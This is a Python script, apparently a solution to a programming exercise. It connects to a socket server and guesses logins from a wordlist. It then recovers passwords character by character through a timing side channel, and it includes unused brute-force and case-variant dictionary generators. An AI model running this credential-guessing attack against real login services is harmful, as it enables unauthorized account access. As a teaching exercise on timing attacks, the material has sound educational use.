# write your code here
import argparse
import socket
import itertools
import string
import json
from time import time
def yield_login():
    with open("logins.txt", "r") as f:
        for login in f:
            yield login

def get_json_format(login, password):
    json_dict = {
    "login": login.replace("\n", ''),
    "password": password
    }
    json_txt= json.dumps(json_dict)
    return json_txt


def generate_password():
    character_set = string.ascii_lowercase + string.digits
    for length in range(1, len(character_set) + 1):
        for product in itertools.product(character_set, repeat=length):
            yield ''.join(product)

def yield_symbol():
    abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    i = 0
    while True:
        yield abc[i % len(abc)]
        i += 1

def pass_dict():
    with open('passwords.txt', 'r', encoding='utf-8') as f:
        for password in f:
            pass_list = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in password)))
            for final_pass in pass_list:
                final_pass = final_pass.replace("\n","")
                yield final_pass


def socket_connect(hostname, port):
    with socket.socket() as client_socket:
        address = (hostname, int(port))
        client_socket.connect(address)
        for login in yield_login():
            json_txt = get_json_format(login, ' ')
            client_socket.send(json_txt.encode())
            response = json.loads(client_socket.recv(1024).decode())
            if response["result"] == "Wrong password!":
                password = ''
                for symbol in yield_symbol():
                    password += symbol
                    json_txt = get_json_format(login, password)
                    client_socket.send(json_txt.encode())
                    start = time()
                    response = json.loads(client_socket.recv(1024).decode())
                    end = time()
                    if (end - start) >= 0.1:
                        pass
                    elif response["result"] == "Connection success!":
                        print(json_txt)
                        break
                    else:
                        password = password[:-1]

                client_socket.close()
                break



def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("IP_adress")
    parser.add_argument("port")
    args = parser.parse_args()
    return args


args = parse_args()
#args are IP_adress, port, messages
#acess args by args.IP_adress, args.port, args.messages
socket_connect(args.IP_adress, args.port)
